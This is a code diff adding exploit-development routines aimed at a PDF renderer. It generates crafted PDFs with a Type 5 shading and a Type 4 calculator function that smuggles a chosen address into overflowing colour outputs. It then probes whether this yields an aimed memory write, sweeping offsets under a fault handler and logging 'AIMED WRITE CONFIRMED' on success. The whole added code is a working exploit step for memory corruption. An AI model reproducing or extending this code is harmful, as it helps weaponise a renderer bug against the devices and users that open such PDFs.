@@ -201,6 +201,59 @@ static void carpet_fill(void *p, size_t n, int d) {
     }
 }
 
+// Type 4 (PostScript calculator) function - marksvia's step 3/4: a pointer-sized
+// integer is a DENORMAL double, and the PDF decimal parser zeroes a denormal
+// literal, so Type 2 /C0 cannot carry a real address.  The calculator builds it
+// by integer arithmetic instead: <m> 2 -1074 exp mul -> the double whose BITS
+// are exactly m, and the value is duplicated to NOUT outputs.
+static int write_pdf4(const char *path, uint64_t mantissa, int nout) {
+    FILE *f = fopen(path, "wb");
+    if (!f) return -1;
+    unsigned char vs[2048];
+    build_vertices(vs, sizeof vs);
+    long off[8] = {0};
+
+    fprintf(f, "%%PDF-1.7\n%%\xe2\xe3\xcf\xd3\n");
+    off[1] = ftell(f);
+    fprintf(f, "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n");
+    off[2] = ftell(f);
+    fprintf(f, "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n");
+    off[3] = ftell(f);
+    fprintf(f, "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
+               "/Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>\nendobj\n");
+    off[4] = ftell(f);
+    fprintf(f, "4 0 obj\n<< /Length 8 >>\nstream\n /Sh1 sh\nendstream\nendobj\n");
+    size_t last = 0;
+    for (size_t i = 0; i < sizeof vs; i++) if (vs[i]) last = i;
+    size_t vn = last + 1;
+    off[5] = ftell(f);
+    fprintf(f, "5 0 obj\n<< /ShadingType 5 /ColorSpace /DeviceCMYK "
+               "/BitsPerCoordinate 32 /BitsPerComponent 8 /VerticesPerRow %d "
+               "/Decode [0 200 0 200 0 1] /Function 6 0 R /Length %zu >>\nstream\n", VPR, vn);
+    fwrite(vs, 1, vn, f);
+    fprintf(f, "\nendstream\nendobj\n");
+    off[6] = ftell(f);
+    size_t cap = (size_t)nout * 8 + 512;
+    char *body = malloc(cap);
+    if (!body) { fclose(f); return -1; }
+    size_t n = 0;
+    n += (size_t)snprintf(body + n, cap - n, "{ pop %llu 2 -1074 exp mul",
+                          (unsigned long long)mantissa);
+    for (int i = 1; i < nout; i++)
+        n += (size_t)snprintf(body + n, cap - n, " dup");
+    n += (size_t)snprintf(body + n, cap - n, " }");
+    fprintf(f, "6 0 obj\n<< /FunctionType 4 /Domain [0 1] /Range [");
+    for (int i = 0; i < nout; i++) fprintf(f, "%s0 1", i ? " " : "");
+    fprintf(f, "] /Length %zu >>\nstream\n%s\nendstream\nendobj\n", n, body);
+    free(body);
+    long xref = ftell(f);
+    fprintf(f, "xref\n0 7\n0000000000 65535 f \n");
+    for (int i = 1; i <= 6; i++) fprintf(f, "%010ld 00000 n \n", off[i]);
+    fprintf(f, "trailer\n<< /Size 7 /Root 1 0 R >>\nstartxref\n%ld\n%%%%EOF\n", xref);
+    fclose(f);
+    return 0;
+}
+
 NSString *ModShading5Force(void) {
     AvePost(@"112611 start: mmap-force aimed write (public V545 recipe)");
 
@@ -328,11 +381,71 @@ NSString *ModShading5Force(void) {
         }
     }
 
+    // ---- the ADDRESS route: Type-4 calculator carries a real address ------------
+    // measured: the Type-2 probes all paint (4096/4096) and never fault, and the
+    // Type-2 literal cannot be pointer-sized (the decimal parser zeroes a
+    // denormal).  So the address must arrive through the calculator: a page we
+    // own is mmap'ed, its address goes into the Type-4 literal, and the
+    // mmap-force handler covers a wrong offset calibration (unmapped -> map ->
+    // the store retries into memory ours).
     if (!verdict) {
-        AvePost([NSString stringWithFormat:@"112611 verdict: no fault across C0=%d..%d - the overflow "
-                 @"stays inside mapped memory on this build (or the shading is skipped)",
+        uint8_t *aim = mmap(NULL, PAGESZ, PROT_READ | PROT_WRITE,
+                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+        if (aim == MAP_FAILED) {
+            AvePost(@"112611: cannot mmap the aim page");
+        } else {
+            memset(aim, 0xCC, PAGESZ);
+            uint64_t aimv = (uint64_t)(uintptr_t)aim;
+            AvePost([NSString stringWithFormat:@"112611 aim page at %#llx, Type-4 literal carries it",
+                     (unsigned long long)aimv]);
+            long deltas[] = { 0, -0x76c, -0x1000, 0x1000, 0x4000 };
+            int nd = (int)(sizeof deltas / sizeof deltas[0]);
+            int aimC0[] = { 2816, 1024, 256 };
+            int na = (int)(sizeof aimC0 / sizeof aimC0[0]);
+            for (int di = 0; di < nd && !verdict; di++) {
+                for (int ai = 0; ai < na && !verdict; ai++) {
+                    uint64_t value = aimv + deltas[di];
+                    int nout = aimC0[ai];
+                    if (write_pdf4(path, value, nout) != 0) continue;
+                    memset(aim, 0xCC, PAGESZ);
+                    AvePost([NSString stringWithFormat:@"112611 aim: C0=%d value=%#llx (page%+ld)",
+                             nout, (unsigned long long)value, deltas[di]]);
+                    g_in_probe = 1; g_mapped = 0; g_page = 0; g_far = 0; g_sig = 0; g_esr = 0;
+                    if (sigsetjmp(g_jb, 1) == 0) {
+                        int painted = render_pdf(path);
+                        g_in_probe = 0;
+                        AvePost([NSString stringWithFormat:@"112611 aim painted %d/4096", painted]);
+                    } else {
+                        g_in_probe = 0;
+                        AvePost(@"112611 aim: second fault, unmapped");
+                    }
+                    // scan the aim page and any mapped page for OUR value
+                    int hits = 0;
+                    for (size_t k = 0; k < PAGESZ / 8; k++) {
+                        if (((uint64_t *)aim)[k] == value) hits++;
+                    }
+                    if (g_mapped && g_page) {
+                        uint64_t *w = (uint64_t *)g_page;
+                        for (size_t k = 0; k < (NPAGES * PAGESZ) / 8; k++)
+                            if (w[k] == value) hits++;
+                    }
+                    AvePost([NSString stringWithFormat:@"112611 aim scan: %d words == %#llx", hits,
+                             (unsigned long long)value]);
+                    if (hits) {
+                        AvePost(@"112611 verdict: AIMED WRITE CONFIRMED (our address, our page, our value)");
+                        verdict = @"112611: AIMED WRITE CONFIRMED (Type-4 address route)";
+                    }
+                }
+            }
+            munmap(aim, PAGESZ);
+        }
+    }
+
+    if (!verdict) {
+        AvePost([NSString stringWithFormat:@"112611 verdict: no fault across C0=%d..%d and no aimed hit "
+                 @"- the overflow either does not write or writes outside our pages on this build",
                  cands[0], cands[nc-1]]);
-        verdict = @"112611: no fault (overflow inside mapped memory this run)";
+        verdict = @"112611: no write observed (all routes)";
     }
     return verdict;
 }
